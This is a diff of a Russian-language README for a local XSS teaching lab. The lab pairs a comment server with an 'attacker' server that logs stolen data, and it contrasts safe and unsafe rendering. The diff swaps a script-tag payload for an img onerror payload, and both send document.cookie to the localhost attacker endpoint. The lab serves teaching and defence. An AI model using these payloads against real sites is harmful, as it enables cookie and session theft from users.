@@ -11,18 +11,15 @@ npm install
 node server.js # http://localhost:3000
 ```
 
-запуск сервера злоумышленника (в новом терминале)
+запуск сервера злоумышленника (в новом терминале из той же директории)
 
 ```bash
-cd k-20.cross-site-scripting
-npm install
-
 node attacker.js # http://localhost:4000
 ```
 
 ## Как устроено
 
-- `app.js` — хранит комментарии, отдаёт JSON, отдает `index.html`
+- `server.js` — хранит комментарии, отдаёт JSON, отдает `index.html`
 - `attacker.js` — принимает украденные данные, логирует в консоль
 - `index.html` — форма + список комментариев, два режима рендеринга
 
@@ -37,7 +34,7 @@ node attacker.js # http://localhost:4000
 2. Отправить XSS-payload как комментарий:
 
 ```
-<script>fetch('http://localhost:4000/steal?cookie=' + document.cookie)</script>
+<img src=x onerror="fetch('http://localhost:4000/steal?cookie=' + document.cookie)">
 ```
 
 3. Нажать **textContent (safe)** — скрипт отобразится как текст, ничего не выполнится
